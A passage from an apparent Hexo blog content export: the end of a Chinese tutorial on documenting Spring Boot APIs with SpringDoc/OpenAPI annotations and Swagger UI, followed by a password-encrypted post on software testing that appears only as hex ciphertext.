<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Operation(summary = &quot;已废弃的接口&quot;, deprecated = true)</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/deprecated&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getDeprecatedData</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 方法实现</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Operation(summary = &quot;带扩展信息的接口&quot;)</span></span><br><span class="line"><span class="meta">@Extensions(&#123;</span></span><br><span class="line"><span class="meta">    @Extension(name = &quot;custom-key&quot;, value = &quot;custom-value&quot;)</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;/extended&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getExtendedData</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 方法实现</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><h3 id="导入依赖"><a href="#导入依赖" class="headerlink" title="导入依赖"></a>导入依赖</h3><p>在普通的基于SpringBoot开发的Web项目中，只需要在 <code>pom.xml</code> 文件中添加以下依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springdoc<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springdoc-openapi-starter-webmvc-ui<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h3 id="启动和运行"><a href="#启动和运行" class="headerlink" title="启动和运行"></a>启动和运行</h3><p>正常启动Springboot项目后，即可自动生成API文档，默认情况下可访问以下网站测试API并查看文档</p>
<ul>
<li><a href="http://localhost:8080/swagger-ui.html">Swagger UI</a>：<code>http://localhost:8080/swagger-ui.html</code></li>
</ul>
<h2 id="knife4j"><a href="#knife4j" class="headerlink" title="knife4j"></a>knife4j</h2><p><a href="https://doc.xiaominfo.com/">官方文档</a></p>
]]></content>
      <categories>
        <category>Java</category>
        <category>框架与工具</category>
      </categories>
      <tags>
        <tag>Swagger</tag>
        <tag>OpenAPI</tag>
      </tags>
  </entry>
  <entry>
    <title>Work-软件测试</title>
    <url>/2025/07/23/Work-%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="ae19d29011458c745009dd97baf48d207de58117ff3fcfc62e278a2e445ad23f">496032f2b63d2429e15fff3c006051953389f9a3ea5a4a740095d64a3f9c68e691719e7dac56df1b6f039600c3a9eb356b055730728fa6bbf16549c935b3ecb793b748e57c92edbc4d9d4e78e00a6f54dbb9dfe145636ff80f0e55f8ac397fd193ba74e1280d21e3180bf324e8bcd4f421cb20eadced58140598acd0c0c71b24dbe6aed8477d49f0ad751386530de446213cf8411f32476162d7dfdaff054b878f5aea7a2db1697540e2eaef11206391a725a707ec3231fe0b2bb2376bdb2a601a24df1568e4f97c8a13c74a5006e2542ad58ee5bf8f811af8f7b53acd1304d49fd3965cb048f5cd9b58d45a5a985591014309ab403352ce0f4030ff91b5fabee0dc2d9b790ef9a25b1b86d7f120b0617a2ea01a8aa6c1b764fc6813c1a623c7efd53b17fb24102c117f88229dcdeaabb7f29f83340d6c486805485e8ecb2ccd9ee9619b9717dbf27c68325b6d4e65afcd72ca35f7ca8b3e3205792d685833778e6fe4e1a1a0fad9381ec46cda657aeb88d360bbdd816b2545e5c5afd998a85488bfd7995642d4ebc93cb75504ceb57a85297813365344176ec494742e36c2210d5a02e66941005f9a8fa56af422c0848884352ef67309ac0060b4448358252146375b150979641d2d6751f84d2f0b9cd4b304964d135a0963007df9d3cbc0195153f7586240cca4bce1c859f0f997788670a7e7bd144a41b31a5e7c80bc4d610f103ddcea734d5ee6373906bc4e2432b4fef553f64b309bbbf7a9875e4fb37039cab9a0cc4f049221466eee3bd8e5b818db2b99294b962797ce0e853554109e27f5818b2e2e636d0d9f78f912f96cede452e0815eb8b13225d0df5e15df504a3053cf11e2e5cd84d438b309f9741a6b59cc7689ed4c2074af2ac0c67acbc0f3d08a5385de2d6ec8b4211f5b67bb7cc5623a8c54dd72e44a9d2441243f78e5b7074121401cfdd3825a07feefed81bc4339a6b92af5b90f8f9451cf87c7bd8ca6add5da67569fc142adef70436bf47623d8777fc048a862bd093571670e9a8706613dc39909541f3ec1b4eba8ca9bc47688d4cad4353f017130d80baf92a4eb0fd53c9c15b3084e29ec966367ad79d777fa31ba9e5e542a7081ccfa11b0456a3fcdbdfbe5b1b8b2ac731f6ac761da4aa567b0bd6d27b30317de4529b452afdcff0d4b454934f7cdd137c84f04c3b70b8ab2bba918bcc3d81e5c80b998c6861220b97458f1f95a1322294bea68d38b2369fa6d353f52f1d2e73a0c15d2f29663ae729701ac3e620cf5390b2e00f0f20b4d39d55d4d52d47613e2bbf48c123d213bfb60e0ee5203c4a62e0c8dfd997cd8fc892047fe90a2e1efa734c35eaa23eddf56404a4036bb319da6f8e087fced02bdb913234d13afbf4b0812136a3823c40ceed53521b3ad7f02f00ed002eac742680b25b5ee4f32dc819865e2c0ba34f045ae71f1ec43bba9cd47c7a0b06f4a85b93403814cc79f0c7fe06bfe30852fa3061246db534bcf06977ef15de1e47dea9798e67ae411610374762f13af800e4219500720ef5107bde8462d5ae4d8ed8c3d3a3fc7e7f89dbeb69243c7dc75e83bf83fdc9d673f87f7e7eb8cc6f4f9465ba6391d08f31ee1bd84048fc20819987aa5e0c0d56a6f9600e4558ef4266251bcc7d8baff6cdfaf4ad715f651fdff2a374b4293f81c8db5a0668fec79dde66a1dcb2c9de18a47f8ad49fc9602c731364c325875b31c1fe04bacf30ac9a080ef6872c8183b6f9606b95821d58fb53fc5ee76583e504d7bf74e1356efa309ce7c66c2ca4de7ca0d8ce47bba6f5eb2457559ac45cefb10c27a93eb22bdf949baa1132fd3a39e670eb0e0f45746af826416534f3862c0b0d4a4f3455e0d6e2c0b6f3761da0ae90af3b5fc876166c6d180a59ba193fa40bcc53aadf9ffab62f7c1b8c03afffabe829c766ce74083aefb04e8ddf885110c12c87ee25867ad5214e253cbb84385fdc7606eb548284d5813bd8029158704186bc105e2c0caeab0d3e46ef8751f04dbef33e0d4a092865bf509d4d594830615d759099bf116b3722c6e7848b68b9576090ec5f4f945bc92939fbdc8f38afeeba23ef14cb0bdf182b4c53ccfe195c328f40c227aca06e1d28978bbb945ea04a49c683cde4e3df8f2bafbafb003e272a3fb239c4d7476a99aa19dfcf2a4b2a4e0ae68c3ad926683ab4c673d5823f4f8e42e329ca9d082ce89b9d3e6148c2f7d53f62ffc492fa8e551c9dbea8f080f24d1b8d5d3af7a20895f5de7baa32aaa6fba158bd68089787568476b9683c4a22682bf1953ec10bbe48ccd7da363503f7df64affbc486863564fcac2568ab1a2e171110a789bbb7a896b56ed3202d1d9e08943ef6ab248d8ea734673076f86774446732c4061f22fcbcfccd02a4a720e641f653e29f484c835f8685e3d1172eaa1e7f5e7bdfde8046e7a37a701a0ee6e55da0359012f08276dc6ab970d9524062ae443e0bcde074e285d717b188901b32c5606bc78abb111c103132eb54b1322273c60cc75a8e68fdce5089dd3b57035ff89918d77bdc98927fde38baa399a15ed8a985ff6b1ec924017400df2cb02ec8af659195ecca985a386692bbe0b269dc4be52cafe92f898d9f813893e4788fdbd505c2a4bbfb9024febee551d79b67945330542816612710c790b842bea79e2d2f0b171d1dadcdf0c43c87fffded939104f34731a645fb982450ae9baf2896de059a3c1e94282ed8c04dc4cf5ff0a0b18d7d69b2421856b767a567d9a4ed92e96820bc0eb5a32b728dd3896c97403b88d7eddad248cd59f4274a3e857ae829626114544e294d12522ea3443c70f0974a4f8e951c9d1f283b083a7e6afc6b6b40cc59ae59b936dc04f724cc4803c66a99bedabadd474c729b64c551e3ae7d8ac3f97012862ac3527773689addf7c517c6e026d1f1e333a727f3690a65144dd33beacead8f4c29b131ff4cfe3358275f2b1ab6633f8383927ace55dce09c05f938ec20dbe52526ae2ca54c08a76b2c2f26cb2e890327a85edfcda0079d175f8c8ba8de84fc47e495c8d0219897195313220565e58cf446e916b599dcfdcf406ad70c5399e90bb118404cd52c9d1b9445fc4f1c51b8b42a823fac3c9ae1734c40dd3ea89d7de9557674e23f8ee7521cdac6ce0d2c2f79b26e2f172c753023ef75d0d8b29fe07e76f0906983fbbe996edbdafc5e98260e4bf8d47491bd80d1aee9e3c4a1d3f3090c02aa120e83cd2c386fb42eeb56d2a9a12a1e5cf47dc5a0b0cb96c4cd8f24f0282c21b2f9eb26b984a2494236da5324c04e95cf9fbf9311795078eb120293746537c7803d244dff3bbc42fdb5bf0a5448c4311424beac9dfce53f3703e1bd9de4d6922540594d8aec999f783678382a79e167ca5ae85d34880b226c55386e5e30274773e8050584e9e2374dce54e332ec2d324a3e24375a68a68f4457ad3105dc26cae92bfe2d035f9c48fbe2350f3bd2f314b1a39cb56e81d9da0946f623e0799d0fd5cd7ce497bcba025bbc8b0763f1f0e631c45577f8d2ec9f28958e97c5b02fb215c36a9d09ca6b49ceedf370ff9287e051750241019e0bcbb680d6b45e982e50034f5f2801e52a7693dd9542b8e44d24a8b215a016adf8de14410d75ff885104df4678b6ab90b9ebc627a513814f5dc5d1e3efbcc954cfc58ebf74501a793489aadfd6eb0d494ce42741e82c490d135790781ec190a767bcc283a6cb7d4e38a3ae52df4810d43ddfa4e043f43cda6219257e8bb667e0b8c0d195cbf55fae3125421ebc1b44f3bc72b0d7aeea79a956e04510160c9eed30963521900d6271575fab5a9fc90106e547dd3b1cf9004c871c9aec325cbd1c50836ec5e67291e89317bc9ad8816ae69dfcffa654149d915347fc7bdf079367857ed6273e7688fad4f899fda7cab4ebb09026be8dea7aa3c2d3fb6f4c5f97a75b0440cd5d8a950a73f89c8fa0cd0d2c0736d3bd3f0ce92a245fe0dbc6036a0e1e3a16831a9a3720fb9037fd5cc17750e16974b05b6d9fd370ac5dcbd66120d7a512d355bc1afe28c34606ecd446825c8c58ea4fb51e33618a423c1195200bd12cb750b6136376e37a1745d63b150051033a0bd9f269f6259f996e8a28ea1a47da66e126d81080a835dc7f15550b5bdf98d9bd9e00d8b229659e8c8d6c1f498ef3fad4fdae57717a3b9a279b54c7e8392adbfc1f70869bd0dd06efc63968af2390d19559029b3e9a20372e6a748f12cfefb9f8d7204e422f2224ebd77aee99e3f2daf85c0ff7d0dd4613e111bfb356588d9e7f014efd5ed6a1644ea49be0af7355ece122dcf28125866e1b232f3bb587a11c361e89282764ec712a3e6b0c54b11da4a818cb80f1ccad29fae2c6e549d805ed12e1b96b8eaf7b7ce7ba04d1276a8714659698f675a222fec7a00a9884ecd8963adfc930eca8a846bca3089392382720920a7738da34fa13a765d5b0e0e45918e22d38a36a9ce614a300604f054e372d83d5630b896ac9f4bee5d233606efcda1a58beeda77643e9e633e0bcb657a304a661a4879302e2bd75a98415f72bab6f51b86376703ba8ca52b4033a71413c8358829a34849289297fe7154aa8950c85a9c79c7d1cced22f8a5753503fc821930a0ebe2832f62fee91291e95f77dfc11ad39ae8fe1197176b8f1cd35e5f0a3d73753af9c72045ab48b1d3b37a495487a3160a17cb69c3d5b36528696e906f83d4df74315e493d29e5626799dc28a736b23fbb24a2dcdb9906f2cae926dfe8b536855fa00541a62b5cb3bd920708b3e3fbee0c58d7b43ca63580b06653f3d23ade7408441c239bfcea1b44fcddb25309a8c42cae0763aa3bbd67b85d1125e1bb319c0b789e0f6ef29c12efbb2b7d4c4750229f72e8917b99e8c3cfdb64c3b2c2f0ce62818f4bad063435a259de58e31e258a2db90da9b5f49c47940504f4f4e4f7f77cd35383297415732999eaa2280c13f418eca4906a54b0372f64da66dcf8f8e1ebfb175cdd27b40368edd306518587f1f14527f061eb908dd078f3bcc77bdeefef5dae0237150a703e26d4b22c96c19d68cccc30cdbac8c272b5e18a650580dad6c95b819e0a4f6c7c2f548056b711d448a9200751169d3a9991c9c9d47a934b096f3da578481255874a4953f79724f38d69f7a92dd30590168cf2bf7a8b5c9e1698e2a2924aac29c883bf8e0150e5a5e3720342a0db2515d8fea87aef27302803e42d62cfff9d2372bc897fd455c7b879f123257764066a61d238a8b57e47d75d63b7ceefcdecb620595b17b2f89c5d5fccebab4746eef47192496d4b5296c319f24be177cfa392836d283486864bbdf44e7bd6536fdfb6d3c5e7e8bed0d517249b9cc500178249de13867d70590ff4a8cc5085922d18866be4efbc83711bf31952ce7de3c4f84fbcccf097bfbd3e8f66a8d9653a21a8e29aa77736f34bba43ce7dd1bb1b043fea4f30c115f93ab44fc89b2c581013ce1a1b18924274302f81c58ae6d5ffdffa67153829679e8c40bbcc87ef5ecf0b2d801ab553380e519cc68199cb9d07d8ff6ed64d2b37d28beb2202a0d3f301bdf740b13903899c7a63b74c09b8a0184f4a4037e03018e605785505553729a3a769a4833c5f50665b31a1c79e9c179cb22531aa027da655ccf28e85c950b72307d71c281e2d8f845012c3608d755343238bb9894d3f86a8268bb18f94ad5366f4a5eb4fc948822335f0c0472775433c9451cf70d0fb15030f282da28747a8f597299176eb69004757e08c3f1d22371be06ed975c8403a9c652d163100662c19e7da15089e019ddc9321c34c7d1c5cf44da2a0e7a03414993db8cd3a66caf1eb00dede2a51f612fec1b5d0147473638ad3c156c06e75c88efb2d108f16a3b326b719247e6e76f63954a13716674e13ed565414daf147c2fad8248caeb1e2bdc602b11217a2f2b40ea9aac533b131ae8a7c14fc36473ab906ae7d5a6ced8d420e5e7a6a04092ea3c5e6ad1c5f2ebbfaa0f2be40e17e01df43ba9fad5673907000f4dc7932751bc6762e5f623c86c37953534651dbf823bc24acaaef711bfab10cc37e18fdc35c693f2fa9d67481a64e758ebe08c35b8b5715a147c17d247dd250e6bf16dc481e6290d2c1ee183e74320753197848d1435ee5bbc4ee2e7340e9cacdfcc276b2a38a53e476981363be678b3ed76404df38ca3c70dd483fc036ecf3ae9cafbb9afaf319412eaa4d2dc5ea90cb6744a932cd0d54ca76d86c6ec3b1e387f8593704c47929240702be71ba7449deba7e849a1c7f4972b6097114c56b3e33ebb69f513d8b53b70726d35b8c7423f9b9e519f33637848c5aca3379294a979afc230aeae9a6999882c9e9fe65330dce01c1b302a48d735609d4616a80cd5be3784487accfb4845f3c36f6b09bc905b44051c3ba2ffc953cd834d473596edfe3cf1eb1723d1bd4315b8ac11a3841e6beec4b7afc7f3df169b748e1cb4618613073f94e03b536213640220df6293d762ec5a548e2d2e802e30a299c61468dc8c314c196dc27e84a215b0006915b869eaf4f33ad33ebbc1e93ce63fb5ef51cef7d58fc3abfff0c9811ce3459e9a1341e942a9d11b7c4dae427d9a82ee87e899c0244fc98a401a36dfa9b9bb00febfcf96be6a741a790590145821ae8e01e7637b302bcdad3a5f2c204c21756f8450c1b7e05ec631d50a4932644c9fff0b12a174f1b98d440b9e1b1e5ccaf3e57f9ff54499c458ae00a177b2b8002eb87ebcebd116ef2600650d7f942af95806e54ac4f8e32f0a07693c845944fd2790cca6d4d3e9e838f5aa8df972898b1c32ecc2d8e73f9c62f9d94e216ef1ade0ed86e9fa46907d58380b80444f53c837065913e4f56ef67831fffa8865666dfda5a9f2b923835ebe99b6e7ed9a526ef7e8eec57739fcf928c7b357ccce75f5b87d5036b83f6a387fb3308a1f0d1b16c1ff4caa3469a3cb82256b0fd5614fd2fe7e8cb96fe0cd410fa1b1b1548b296eb5c9af18ac5742c5d3c441430da6ee13051195e7c926b0806c0a2e3ac6199e4e955492bf83fe64d19dedda8b030f825b63da4c963cceb981c79a1558ba81b8d552fe5dbebf5bfb1c5283d52c8488bf81d3466870131efac7224f024c818318870ba56292bfcde001640f4410614890b69da4d500c060418355e642dd12a08d6a1483533924bb15f32b5b3cd2b14877c75a0b22597ab16dbd1e697e7dc908ccf2b84bea5674c74676bf1fac89c8754111739b3d9dd18dabd029918efdcb1501db971385c68bc6704b4b1a359342908de334d30558f61eb481d8652f40a64ebd2603a5e17b651887e52f56488beaee8b866d017f98121f4b563d575faafbd8145ed43fcdf99d0b642b7e9036ebad8122a4303956b55963c78dbe7420d9ac8f6b9174a54c1030dabcb92aaf3c3dcbada87ba94431a47f6bed28c11b1abf73ad68b87a03a26c38ccf2953471d33ddd1ec76228ca3d642b6e59197af0a6a6a71424a4b2f9af74944738439fbda6f72de2f63d7318b721baee55d209f9a04cc7b419950811659d97719b09e3728ed570e1d6184791e631e2fab8f616aefd28a6d06a810935f894b1dc7ce3b3d2e82d605e5cded684c19b6ae88226200006a98bb59aaf9c0b850bbcdb03bf3a327c67b5281725f3fbaaf62f3e6c1e6f5222f0d32e8f0e591fc97aba6b804d4f0844e5a3735a128678330f8e69d6c38dd8fb9905eed5610457e4824341c1332df9e9306e01a0f0f27e95be776d3a3e07fd4722259fb0b2ae4782afbb4dce3533b7be275bbc4a2b2a42d628f66052a689872bd2a16be1b51cd4049328eed5a7484fbb0ab9f81e2cfc840687a15aed96c9c9ae13954fec8c35afeb4456ca83a2d6db62e754d6c188b176a54b79c966c4f8f422b430caa6712954116e4356cd99ff759c4e00a6348896fdf2e3015a9c9b6613b5ad198a5c21d199affaf1af685dc231e878c2b2a0e8388d81cd32d563e31ca05cfe429d06ee3331eac33205998918f5083e26d2eeb0ef7720ed715913dfc3047f0ca7b72ad392180e5d590862fb76bc788e573bf67daa857839488496c45a0732f3567737133e9720d8a72b8fc9161f203a887833a5a975cd67823b8c64bff18bc5a1f821dd053ce788651c0c29d71efc0a6493c903d765c7f817e538aebf2a0ce79e2c4ab7f71fcd322764acbdf542d5cbae0740bad8df27895addbaea5a3e4aff8abca6bf6d05560e3f4c2fe495ad2d22c49f4ee48df0f999242de0f00055b20744822cbe5dac5384e5876b064ea70f0b973f43a0cca6d04306524a247edbac3b2a7d5c18e801da0d4355ad7acc54adc7faf0759cc08c5c107eb35f26717d0265b5434e223ead2fed65fac5c34079cac39547b6523404db5b8df2aaf6ff17f8786a8182918165e04e9508c12b499cce2345a80e01c41ac2787b9e7e226d8947a7ca4ae87ccf4bdef3810456d611dc7bda389ad1bb183ac48cd22791fc4ffd2ad15db8be9201457a911578f98c40b1bdd7b4ef33b627bb71749b49346d3dd7a6dd25d1e2a74b7e2671e69034b3a2cc431138fdcf520375b201ce41004e0fd5cb39ada37fae4aeb1e1506107a2ebb14fbad341e65ef19397035cfe40ba91134b7fa7a08004d5bb3e10838348555431eeebd6f53e82b466c2865a69665d70c6175276f66ea5e8e652fa32f4684bef583815aaa7cb48a999041f135da6db42e957243d5db19ecbdb3304144c49b3a43cca4061bd5d3f21806625ee657f73e2005e105216bdb2d74e1c41e126cbfbae9df5625a8bee83a8bb2ad70b1e24f782cf176b03df1f91a26966922582bcc9caea49d5acc975ecfd63df3a6aa1e00aaf03fd59361d1abf51f0cc7b8b3086ed4f65450f6849ea387618492e3882f65c7cf968cc75a20c553e1e91e8a19790646d367237e99f45746de2b2a003b35f0048c1fd61a6f1970245206294ce5f44f9423223a1d600f1d4909ddca7569349b62e1cee8d049c813492710de9e5f11a24596ad0df8ecdd4b0c8156901129713d969323849694dd3d599f95a1c81e7f07272ba264a05b0844bf78cd2291c139e2b594463e8ad201fe3e78b69d24066ef271ac8b95c7eedb3a481947776af2a752d4100ecadb8fb9d79ace30e6c859dc41381f7d141edf46660b51595d3500b97ef6b5c3ba434b0855c36fc84533f5fb34cef770b3d41d837393392976d8f7c7176f115e26eeca6368b7d13f55ce9ef97a33ef05bb0951a84fcda297fc5eaae6b81b43b77f5b754fc1a9abcb6f6c093d0993118c4fae919a51e3bcb15b08472468f150348f3eedc2bd6b9b7b88bbe52d04a55a210e847283b2815ccba779fff772263d2b1ff6431831bf3215c88d3f0ca645b1c8f7c72facacf88b25b0d1a5b52cb1bc874fd2169948c8516ebf99b44125c0cd23fb6de10e376dd7cf0e0e420b159328b6ae2ec2b1c36f231900544e7d560bd3e245273d7d7aa1e768da1417ebcfe97646525e9fa6d2484624ce9aa478b495821a2fe1391adedde1cae3401237cbe8bbd323813846192a1872d4c3e666c2700e7b8cb4f87e95c98fa47128b6dd09f8ce113439aeebba38f5ec98d721709a298e859b9e014d65faae56c76089ce68ea9fc71fa0e204681cca88fe55385d373e4190d7ae15f25a245b9edda71ebb4ded792a031aed9fc34b0f90f06c1120231807e1a582c1437bc52e39811810a2d0655575760eff6a755eaff0dd8fa3482e9f8968fe8eb733c7fa9b42f9d523f39261a71a5c2fccdaca37d237133e9eaf36091accf37ceced21a718462ce4a21cf38bd148245a54be8edf28be680f5d0d36c9a22494cc385d81114e8ae3be478c6fa00b86fc40734725d97bc7d0cea0b5f837209d3d744021ee6bf4975382525bba52025ea8a8ac4c1971a40f60ab3b493b5c22667ecd1fc47f53ec70d24a2520965193ea1e7a8a1ea55be2b821ce2795617826b8d7d8e1607955554609eef22b6f4154b3125b4c2017217af1b8b89242b82bfe44c95db8fad47c929382c696699ec1a81391b3bd0a9761755a64b9ebd2ece23b733f6402811d4a69656d18fb50fb104b31c1260dd7f368aebd463cb226f770d672e48bdfe34ef5fb557d45f3a929225142665b2b51ca53496d2c7a9c84c9dfec922666d1efbce5de6a4ff4493f6eb1b573baf2d8c580443dadb99b43a7d7dcbc5826a081154f842f9db475965fb26ca96a8272142ca1ab23f0310c9f60e310c6babb0c024d761412984f4db0882340a65452ccb0d5bfd3c231dc18f1d420468dcb4037c816d2ebc86a4d8e2237e58f28064d879b4916ef4ae46666bde568d3a562bf11edfb3ad9d0de3332372aedfd8fb96ca58d6fe65106700e8f0e58640fad0ae266d9a0b169165c217fb296a62b3a1bef8de7e8851f91d2e1780dbbb980a76191b0e8f4239c3182c6f688029cd9547070f3668f76641c04de78689963f630f70f8e4515c7be96458b211147c4f7b5a35f8ab1d87be859d8854297d7fe8bb6a442b866278078ffd57c6ea44ba9c5b58b73f99e147e4a303ca5940765479505bc5912a9e1b41b5bff9600bef077af4ee0c122cb647f566e01e93a13ce8010ad40daf3617076cb3d8ffd8fe8053c4670eb1ab5fa7d2db06d3cd03b126b95711814db26fd7c250b28553a9e5732e61671b2ad1a8225ff45935ef2788051daddc04f627f069e7f3b2e39d8cfffbe6b5230b2770908bcb85040d186f99b7f422831d102c9f0becff46c4a3b26752f4d324a10f95acb4a984599489d7ec734bc1a305cb2fccb9e560d048a3a271967a3102af55e470e0cd449313e34aa7af110a3fa8fa9a1650e6856ce425ebe1f3e50bf596af9010cbf2107ca4ba2bcda2d63228d3b6027695275d33d675661e0942e773853d933a74894507c73ac924da18e23b0817cdc708857058f4e5405f8ece0c1ecd51c8171358d01040193f362224a91473f2bfd63d0f66616ed4c07211a1028f6bd26c2e22529c3862104125d75b823f906c4f0139ca844e135145f5bf5e68e66a855da43d89182dfb28c6d2a9be928fa858b0cb78e57555a270cbde6e4bf32f45ad3640d3405e7bd6f3c7f9ba13d61ac61233bb14edd6c15b0eb631b0d884c83e9cf00f2516349a59319aa2f68f2c09cb66ee5d2395c0db74f34535ad328089a7bb04a71c603197d0beee290ef33cfb49ae0ee1ae38a875d6ebb304e1d2faaab574581d59400990632cd379cf5b55b30d8263b264b84e87a4c19e5c4c92de0d1daee646ba04da04b984ab14cf607909986f72b57eb0cd03ee4b901a0d5b0f8c716de92fbf67f78504b1cf1b7ad9e7573c03a510d1007002d80eb5d2232436fcdedf003dda43d59015878d000f4fc8170b00e4cae1eaa5f2693cd38562ecad854e6bbe79c25b649c4e4f956079063705c3f5b94c752097b893ae6834c4ea55a4a2691ccedb09a0309950be9268112c5c456ac89fabb34976018c94fb62ca42ba3e1a769edb829f2062c4439313718411f58055e3d0abaa8831644c9b356c22ec0d5aba462c32f1e9a1bc3a1c1be58c001e8b88951f375ccc190786a1b88c92ea2d4168d85b9617bcc3ac218ffa856651cd6ea9d2b0a2b2b8eb6b9dd9012aa1eaca874639b9def97c11a4b30810add1c2702fd8252600376ee3074d98915f4fd96ac3f43a77f4693df3c5ea5f6d304c30038fdb6e938f39d1276114d9bbf74a4d752db81d5344d9d8defad08b3fa3e3e6ef5733ef156ae4e7784e1bf2ecab4d8fcadc95708c4f0a18b477fa4c5bed532e95b57d57c89d72d9092ae9442e2102af6023311eb543b11d15aecd15aa5acfe7db6e2142bd87a95fcc55e2c3a2a61f4439d7aa9b6757e5c8f213cddd496ddd012e59638d037f3c057e702b7c712a53b95aec85746503f03bcb651e48915615032bd4de9607b0d2cdcfca1de6c4230aa8921361b5ec814fda995f7fdcfbe01bc0c79dcaeddb735c127776369010dd59b517ba36a547b7489d94bf892a9fa18bdcb8d8786521e88dba909c2d077560ffdcc36d12029b44d74025c410240e915cb1407106f0ec1a6c9d9bfc1a0bf701e6b51a6df4c6df08bfd6e39f1edf4a7450e07a1f7c09d258ec4274ef50e1450b5dbfce761ca190d48d6f9e4d239c1af863ba682a8ae3038a08129579e5a21a0ea63734cd83b744e732c2708a36e903f1a1f35e71aa75c437d1d85babba699c7112f8175b145b585146289be263e7873c6c862eb96fcabff7692ae7d700d2c61f296155acbf8f2f7aee1f6a49295aa3cbd7fc0a77d1f10606d6dea7a8ffa8e5fddeac040dd56e5aed20b871e88c7d7ba79ae222b48576c94a9170efc3bb44fb13f08b82a6e19873fe41536c5b571f1cdf6d5f1810490fbf4ba930bde23ac217ad4dee4d960fb629ba17826c3b1673dd70b40a60635469c13b9bd49e72c88822858c1de781d180ffd3cdf54187919f912dee0759c09a5ee1ec4c3d8a4947d84368812c52d2e1da62c51a2a50f01521dc70df3387724eb418ef7f782726c058dcd2523df197a453f14442d3bb3b060abea0855dd6e65a14964c16748bdd169388dab90bc8f5696ba7cfe3ee33c8be447a5ec93e26d251d4dd0b3043d5ae87fd550539044e9ab7ed82327f1b51738277a0df2dc59eaa871d33bcc29c58748bdff5ac4b0ccd57528410b19e4330163a141de1467b5f153ee593f5c569250b6d204c0345c06b2e4ad64dcabb35f403815f6e5ccd9716bb89d1f7daa41d06046f32d60aa5507e5e6f583ed65e8039e965955d6ad68ef5143877a60cd8534356b4442918e8bafbc0981fb83e689b1f5b3d4a386f2c88921a26dacc11b5d3a99f17b01b73fb158d802ef7b601cc33bc5019306161c175195db29c423a72bfe67eb8aa66935156ad3368f3c94caab9ce53eb5927ff374fe3c145e9bcfb3dffde53f5c1371a38fb1b13808df0bade8af53b08a278ef1c705cdc9a2540453212b60e25584260ba394416a495ae27f305b8072f1d7d6766401ce4cd1ee1ca8668c76b9f9be7171ad549f887e10691cff016a1ce35f2c606b9f6b81c8c21683af0372c5e2aca01f4f51f14500e9f703bf0df1a4247c813c29a1ab7909db00f33b65a685c5ce740beae9178ada5ff3fe3fe4eb07a5e73f775559e758aed29ae7c94802ec1268b6705f56b72ced1b032f7ade340e7b65f4c426069c796dee2836aabd3e38de0b7e68350b2efe6aa7894d76a48664eba9810fffa7bde2246bdac1382e953eaf16ca71aabe4fe5f5875c604b668f51865be4d46306a934183357ac96e30a8bb6c6a01ee1f923975ebb5f835d2eb13ba9ec1951256b9792e118382e82536798fd3bcdba778bc3f923c7907db5950017e269e73c6c418d8b55a7d71f6e9a3c2370a3c836bdcc53cb6a89716a218baba99a691cd3325869dcca063b5af6bc9b9a4ee2a0e24e0754f4b04e5da5ea7ceb6ce442de3ae3768772e5f941220acfdba2a0f555bd17d676adafd8e6422cea3bba408f46fb4ad295487aee493c6b1f398dfa25502b50d31e5e42ba4c088e052bc54f29a6618412f4ef56b040cbff0bf10ad450182a191a72a8ed5027288ca06ca73a9d0e951c29f64d666c3f2d753d42e5fa295564412df13afc8560d34b67f85b870a5dde99b365165f4caf5c20f3959e501d6a19c1832b1aaa59d91a5458dbecd354d671de304190ef7f311aa3961198ec344bd4b8c1e7d063cbe0ddfc8768e2e1d5eeb8c19cd59940ad1419f11cf5e0f399d21a12c0b87d1d0cd8e858727b636ddc47dfe8d361f7a47b4d3313d87d0aa35d32cf144b64b075a1cc1922dff24a69d3ae5444a530e408c696ab1b00d4a15b9691c3671cf6819b4cb6718751c054a8a5758227a00df74a84831ecfa37674f29141ce3228a19f27d224072c41530c336d126b8953571752ec5950b089b27b02144e7fcdde84fd09f36d2beb12c26c78b57240e8f3d891347c000c7a032e54e99bc23ad50a75b074757f475f6126d599ddbc131dd0ec8327a755ec702b0e03a2c1acc5000e84ce519ab24155f702d9971961238a15d353d9331342e217dcdbbbc9deefe77591ce5d61e9eb6f546febc25cef4ab6db73c54d09d04bfd458d33a00d4efc8be0f090c179ba8c4123e18743ef90c4212826604904798fe37a65761905eb16edc8203ee2d3808ac432d2e41bb075ba8e78f790ae26f2b6d3720bbb23bc586f1c7209fd1512894cd468af4d93b3b6b116a03dab4e6167019a89ba7f13244d85cbd2680bc5f8a3fe5219811a83853fcaed8df79dc92b61ede8cedaa567ace70a155bd8a4d4fd45d76787c1242c58c3dfc58fe0e4d18677956c55c1c2b3ea4eb432d908228fa30fc0e671aa1232d8048597efb581e66bc81e06ed283c59d49e71516bed0e64bdb01e3a4c11065e139701d45d4abfc96b895117d0d72b549e3ca212b4ca0eef42b75031a20a596edac8bb8bc6a8e194cbfbc38c9fee0feee107816eb64ac1c42c1fdbf0136850bdaa729f2035e8131dc27623b272f25da0037333ae9a6d7144f4c44188b4aec47f26a358f8cecf58fb